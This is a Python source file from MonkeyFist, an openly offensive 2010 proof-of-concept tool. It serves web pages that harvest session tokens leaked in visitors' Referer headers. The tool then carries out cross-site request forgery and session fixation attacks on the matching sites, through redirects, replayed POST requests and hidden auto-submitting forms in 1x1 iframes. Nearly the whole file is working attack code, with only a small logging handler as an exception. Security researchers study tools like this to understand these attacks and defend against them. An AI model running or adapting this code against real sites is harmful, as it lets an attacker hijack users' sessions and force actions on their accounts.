#!/usr/bin/env python
# Lib for MonkeyFist
# 
# Written by Nathan Hamiel
# nathan {at} neohaxor {dot} org
# Hexagon Security, LLC - Hexsec Labs
# www.hexsec.com
# 
#
#    Copyright (C) 2010  Nathan Hamiel, Hexagon Security
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    See <http://www.gnu.org/licenses/> for details.

from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
import time
import datetime
import random
import threading
import re
import urlparse
import httplib
import urllib
import urllib2
import xml.etree.ElementTree as ET
from StringIO import StringIO
try:
    from lxml import html
except:
    print("You don't have lxml installed. Install it using easy_install \
          or your OS package manager. Just make sure it's 2.x or higher")

# User Markup for the short term. This may get replaced later.
import markup

version = "1.1"

class RequestHandler(BaseHTTPRequestHandler):
    """ Custom RequestHandler to handle the different payloads specified """
    
    def send_404(self):
        """ Sends a 404 back to the user's browser. This is useful in cases
        where the browser may request something that shouldn't iterate through
        the payloads stack such as requesting favicon.ico """ 
        
        self.send_response(404)
        
    def send_attack(self, attack):
        # This is the default for the GET request and defaultpayload

        # send attack to browser
        self.send_response(302, 'Success')
        
        # Add headers
        self.send_header('Location', attack)
        self.send_header('Pragma', 'no-cache')
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        
    def send_GET(self, tokens, tokenvals, targetval):
        """ This is the method for constructing the GET attack type with the
        associated tokens """

        if len(tokenvals) > 0:
            tokennum = 0
            tokenamt = len(tokens)
            
            for value in tokenvals:
                
                combined = tokens[tokennum] + tokenvals[tokennum]
                payload = targetval.replace(tokens[tokennum], combined)
                targetval = payload
                tokennum +=1
                
            self.send_attack(payload)
        else:
            self.send_attack(targetval)
         
    def send_POST(self, tokens, tokenvals, targetval, headers, headvals, postvars, postvals):
        """ This is the function for performing the POST construct attack.
        It can be used when full session data is leaked or when necessary data
        is leaked """
                
        for index, value in enumerate(tokens):
            # Check to see if there is a token in the specified header values
            if value.strip("=") in headvals:
                
                # Grab the value for the token
                valdata = tokenvals[index]
                
                # Grab the index value in the header values for match
                valindex = headvals.index(value.strip("="))
                
                # Replace with the session data
                headvals[valindex] = valdata
                
            if value.strip("=") in postvals:
                
                valdata = tokenvals[index]
                
                valindex = postvals.index(value.strip("="))
                
                postvals[valindex] = valdata
                
                
        ##########
        # ToDo: Need to add a check for multiple cookies. Then merge the cookie
        # values so they only end up on one line like a normal request prior to
        # constructing the header dictionary
        ###########
        
        reqheaders = dict(zip(headers, headvals))
        postdata = dict(zip(postvars, postvals))
        
        # Url encode the POST data
        encpostdata = urllib.urlencode(postdata)
        
        #############
        # ToDo: Displays error if not found need to write some logic around
        # trapping the error condition, just in case some dumbass sends a request
        # to a url that doesn't exist or is unavailable
        #############
        
        # Send the POST request to the url
        request = urllib2.Request(targetval, encpostdata, reqheaders)
        response = urllib2.urlopen(request)
        
        
    def send_PAGE(self, tokens, tokenvals, targetval, destination, attacktype, postvars, postvals):
        """ This function constructs the PAGE attack. This can be used with either a GET or
        POST type of attack """
        
        print(tokens, tokenvals, targetval, destination, attacktype, postvars, postvals)
        
        # Give the value to the meta refresh        
        metadest = "0;" + destination
        
        # Determine attack type GET or POST
        if attacktype == "GET":
            
            # Construct URL with tokens
            if len(tokenvals) > 0:
                tokennum = 0
                tokenamt = len(tokens)
                
                for value in tokenvals:
                    combined = tokens[tokennum] + tokenvals[tokennum]
                    payload = targetval.replace(tokens[tokennum], combined)
                    targetval = payload
                    tokennum +=1
                    
            # Create header value with a link to the attacked site and the meta to destination
            header = '<link rel="stylesheet" href="%s" /> <meta http-equiv="refresh" content="%s" />' % (targetval, metadest)
        
            page = markup.page()
            
            page.init(header=header)
            page.br()
            
            # Write the page to the user's browser
            self.wfile.write(page)
            
        if attacktype == "POST":
            
            header = '<meta http-equiv="refresh" content="%s" />' % metadest
            
            # Check to see if there are token values so a stack trace won't happen     
            if tokenvals:
                
                # Grab token values and add them to POST values
                for index, value in enumerate(tokens):
                    if value.strip("=") in postvals:
                        
                        # Grab the value for the token
                        valdata = tokenvals[index]
                        
                        # Grab the index value in the postvals
                        valindex = postvals.index(value.strip("="))
                        
                        # Replace value with token value
                        postvals[valindex] = valdata
                    
            
            # Construct Inner page for iframe and write to page2.html
            page2 = open("page2.html", "wb")
            
            innerpage = markup.page()
            
            innerpage.init()
            formsubmit = "javascript:document.myform.submit()"
            formname = "myform"
            formaction = "post"
            inputtype = "hidden"
            
            innerpage.body(onload=formsubmit)
            
            innerpage.form(name=formname, action=targetval, method=formaction)
            
            for index, val in enumerate(postvars):
                innerpage.input(name=val, type=inputtype, value=postvals[index])
                
            innerpage.form.close()
                
            page2.write(str(innerpage))
            page2.close()
            
            # Create primary page
            page = markup.page()
            
            page.init(header=header)
            
            # This is a hack for Markup.py so it will properly close the iframe tag
            ifrmtext = "this"
            
            ifrmsrc = "page2.html"
            page.iframe(ifrmtext, height="1", width="1", src=ifrmsrc)
            
            # page.form(formvals, name=formname, method=attacktype, action=targetval)
            
            # print(page)
            self.wfile.write(page)
            
    def send_FIXATION(self, tokens, tokenvals, targetval, destination, postvars, postvals, fixvars, fixvals, idsrc):
        """ EXPERIMENTAL: This is the fixation handler. It needs a lot of work and is very simple at the moment. It's currently
        Experimental and just used to demonstrate a PoC of this type of attack """
        
        # Yes, I realize a lot of this is duplicated from the previous payload. It's just because I don't know
        # what the hell is going to happen with it.
        
        # Give the value to the meta refresh        
        metadest = "0;" + destination
        
        # Make the request for the idsrc
        request = urllib2.Request(idsrc)
        opener = urllib2.build_opener()
        
        # Add a useragent to the request, Yeah, I know. This should be user definable. Maybe later.
        request.add_header('User-Agent', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.11) Gecko/2009060214 Firefox/3.0.11')
        response = opener.open(request).read()
        
        root = html.parse(StringIO(response))
        
        ###########################
        # ToDo: Currently only looks for name = value situations. Needs to
        # possibly look for others too such as id 
        ###########################
        
        # Grab the data values for fixation
        
        for index, value in enumerate(fixvars):
            for node in root.iter():
                if node.get('name') == value:
                    fixvals[index] = node.get('value')
                    
        
        # Append the fixated values in to the POST variables and values
        for value in fixvars:
            postvars.append(value)
        for value in fixvals:
            postvals.append(value)
        
        header = '<meta http-equiv="refresh" content="%s" />' % metadest
        
        page2 = open("page2.html", "wb")
            
        innerpage = markup.page()
        
        innerpage.init()
        formsubmit = "javascript:document.myform.submit()"
        formname = "myform"
        formaction = "post"
        inputtype = "hidden"
        
        innerpage.body(onload=formsubmit)
        
        innerpage.form(name=formname, action=targetval, method=formaction)
        
        for index, val in enumerate(postvars):
            innerpage.input(name=val, type=inputtype, value=postvals[index])
            
        innerpage.form.close()
            
        page2.write(str(innerpage))
        page2.close()
        
        # Create primary page
        page = markup.page()
        
        page.init(header=header)
        
        # This is a hack for Markup.py so it will properly close the iframe tag
        ifrmtext = "this"
        
        ifrmsrc = "page2.html"
        page.iframe(ifrmtext, height="1", width="1", src=ifrmsrc)
        
        # page.form(formvals, name=formname, method=attacktype, action=targetval)
        
        # print(page)
        self.wfile.write(page)
            
        
    def grab_referer(self):
        """ This function processes grabs the referer """
        
        # Grab headers from request
        reqheaders = self.headers
        
        # Get refer
        ref = reqheaders.getheaders('referer')

        # return the referer
        if ref:
            return ref[0]
        else:
            return None
        
    def construct_attack(self, ref):
        """ Construct the attack using the payloads file """
        
        # Make sure you don't move the payloads file out of the current directory
        # or if you do change this to the right location
        attacksfile = "payloads.xml"
        tree = ET.parse(attacksfile)
        sitelist = tree.findall("PAYLOAD/SITE")
        
        tokens = []
        tokenvals = []
        headers = []
        headvals = []
        postvars =[]
        postvals = []
        fixvars = []
        fixvals = []
        
        # So if the referer is not None
        if ref:
            url = urlparse.urlparse(ref)
            urlnetloc = url.netloc
            
            #grab the parameters from the url
            params = url.params

            query = url.query
        
            sitematch = re.compile(urlnetloc, re.IGNORECASE)
        
            for item in sitelist:
                
                # If the referer matches the site
                if  sitematch.search(item.attrib["l"]):
                
                    # Now construct the payload with the correct token
                    contents = item.getchildren()
                    
                    # Grab token IDs from the payloads file
                    for content in contents:
                        if content.tag == "ID":
                            tokens.append(content.text)
                        if content.tag == "TARGET":
                            # Get the TARGET value from the payloads.xml file
                            targetval = content.text
                            
                    # Try to grab the session data from the referer, if broken pass
                    try:
                        for token in tokens:
                            remaining = ref.split(token,1)[1]
                            tokenval = remaining.split('&',1)[0]
                            tokenvals.append(tokenval)

                    except:
                        pass

                    # Check to see what type of attack method we are going to use
                    # Then send the appropriate data to the function
                    for content in contents:
                        
                        if content.tag == "METHOD":
                            # Determine method of request. GET with a redirect is the default method
                            
                            if content.text == "GET":
                                self.send_GET(tokens, tokenvals, targetval)
                                break
                            
                            if content.text == "POST":
                                # Grab TARGET, header data, POST variables, POST values
                                
                                for content in contents:
                                    if content.tag == "TARGET":
                                        targetval = content.text
                                    if content.tag == "HEADER":
                                        headers.append(content.text)
                                    if content.tag == "HEADVAL":
                                        headvals.append(content.text)
                                    if content.tag == "POSTVAR":
                                        postvars.append(content.text)
                                    if content.tag == "POSTVAL":
                                        postvals.append(content.text)

                                self.send_POST(tokens, tokenvals, targetval, headers, headvals, postvars, postvals)
                                break
                            
                            if content.text == "PAGE":
                                
                                for content in contents:
                                    if content.tag == "TARGET":
                                        targetval = content.text
                                    if content.tag == "DESTINATION":
                                        destination = content.text
                                    if content.tag == "ATTACKTYPE":
                                        attacktype = content.text
                                    if content.tag == "POSTVAR":
                                        postvars.append(content.text)
                                    if content.tag == "POSTVAL":
                                        postvals.append(content.text)
                                
                                self.send_PAGE(tokens, tokenvals, targetval, destination, attacktype, postvars, postvals)
                                break

                                        
                            if content.text == "FIXATION":
                                
                                for content in contents:
                                    if content.tag == "TARGET":
                                        targetval = content.text
                                    if content.tag == "DESTINATION":
                                        destination = content.text
                                    if content.tag == "POSTVAR":
                                        postvars.append(content.text)
                                    if content.tag == "POSTVAL":
                                        postvals.append(content.text)
                                    if content.tag == "FIXVAR":
                                        fixvars.append(content.text)
                                    if content.tag == "FIXVAL":
                                        fixvals.append(content.text)
                                    if content.tag == "IDSRC":
                                        idsrc = content.text
                                        
                                self.send_FIXATION(tokens, tokenvals, targetval, destination, postvars, postvals, fixvars, fixvals, idsrc)
                                break
                            
        else:
            # Do this if there is no referer
            for item in sitelist:
                if item.attrib["l"] == "defaultpayload":
                    contents = item.getchildren()
                    for content in contents:
                        if content.tag == "TARGET":
                            # ToDo: This just grabs the payload and igores token at the moment
                            # This should probably be upgraded to do a check for that.
                            payload = content.text
                            self.send_attack(payload)
                            
    def handle_static(self):
        """ Temporary fix. It's understandable that this could mess up and
        possibly have a race condition. If this was something other than a PoC
        this could be an issue """ 
        
        f = open("page2.html")
        pagecontent = f.read()
        self.wfile.write(pagecontent)
        
                        
    def do_GET(self):
        """ This handles the GET requests """
        threading.currentThread().getName()
        
        ########################
        # ToDo: Write some error handling that checks to make sure there is an
        # http:// in front of the referer. It stack traces and hands the first
        # payload off when it errors out. Should either just handle the default
        # payload or add an http://
        #######################

        referer = self.grab_referer()
                
        # Determine path of request.
        path = self.path
        
        # Check to see if it is looking for something that should be handled
        # statically
        
        # This is for the PAGE payload
        if path == "/page2.html":
            self.handle_static()
        elif path == "/favicon.ico":
            self.send_404()
        else:
            self.construct_attack(referer)
        
        
class RandomRequestHandler(RequestHandler):
    """ This is a modified version of the previously constructed RequestHandler
    that just cycles through payloads.xml randomly. It only grabs the target
    value though so it will only work on GET based values that don't steal
    tokens """
    
    def get_random(self):
        """ This determines which payload to send to the user's browser. It
        determines the highest payload in the file and determines random
        payload between 1 and the highest number """
        
        attacksfile = "payloads.xml"
        tree = ET.parse(attacksfile)
        sitelist = tree.findall("PAYLOAD")
        

        # Hack to iterate through the payloads to find the highest payload.
        for item in sitelist:
            highest_num = item.attrib["n"]
            
        rnd_payload = random.randrange(1, int(highest_num))
 
        for item in sitelist:
            if item.attrib["n"] == str(rnd_payload):
                target = item.find("SITE/TARGET")
                target_url = target.text
                self.send_attack(target_url)
                print(target_url)
            else:
                # Just in case some idiot didn't properly number the payload
                # file send the last payload in the file
                if item.attrib["n"] == highest_num:
                    target = item.find("SITE/TARGET")
                    target_url = target.text
                    print(target_url)
                                
    
    def do_GET(self):
        """ This handles the GET requests """
        
        path = self.path
        
        if path == "/favicon.ico":
            self.send_404()
            
        self.get_random()
            
               
    
    
class TestingRequestHandler(RequestHandler):
    """ This is a testing request handler. This handler does not perform attacks
    it only logs requests to a file with the current date and time """
    
    def grab_default(self):
        """ Grab the default payload from the payloads file and sends it to the
        user's browser """
        
        attacksfile = "payloads.xml"
        tree = ET.parse(attacksfile)
        sitelist = tree.findall("PAYLOAD/SITE")
        
        for item in sitelist:
                if item.attrib["l"] == "defaultpayload":
                    contents = item.getchildren()
                    for content in contents:
                        if content.tag == "TARGET":
                            payload = content.text
                            print(payload)
                            self.send_attack(payload)

    def do_GET(self):
        """ This handles GET requests for the TestingRequestHandler """
        
        threading.currentThread().getName()

        referer = self.grab_referer()
        
        if referer == None:
            referer = ""
            
        path = self.path
        
        if path == "/favicon.ico":
            self.send_404()
        
        # Log the referer to the logfile w/Current date and time. Pretty simple
        # for now maybe it will be expanded later
        current_time = datetime.datetime.now()
        logfile = "logfile.txt"
        file = open(logfile, "a")
        log_string = "{0} - {1}\n".format(current_time, referer)
        file.write(log_string)
        file.close()
        
        self.grab_default()
            
            
class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    pass

def print_about():
    """ This displays program and version information just in case there is some
    crazy necessity to keep this thing updated """
    
    print(''' \n MonkeyFist v{0} \n
    Brought to you by: Hexagon Security, betta axe somebody
    http://hexsec.com
    Written By: Nathan Hamiel, A+ Certified Computer Technician
    For more information see:
    http://hexsec.com/labs
    This is free software \n
    Use at your own risk. \n '''.format(version))
    
def check_update():
    """ Checks the site to see if there is an available update for the tool """
    
    connection = httplib.HTTPConnection("hexsec.com")
    connection.request("GET", "/VersionCheck/MonkeyFist/current")
    response = connection.getresponse()
        
    current = response.read()
    
    print(version)
    
    if version < current.rstrip():
        print("There is an update available, visit http://hexsec.com/labs for \
              more details")
    else:
        print("Your Version is Current")
    
        
def start_server(type, port):
    """ This starts the HTTP server and serves it until Ctrl-C """
    
    srvadd = ('', port)
    
    if type == "standard":
        srv = ThreadingHTTPServer(srvadd, RequestHandler)
        srv.serve_forever()
    elif type == "random":
        srv = ThreadingHTTPServer(srvadd, RandomRequestHandler)
        srv.serve_forever()
    elif type == "test":
        srv = ThreadingHTTPServer(srvadd, TestingRequestHandler)
        srv.serve_forever()
    
        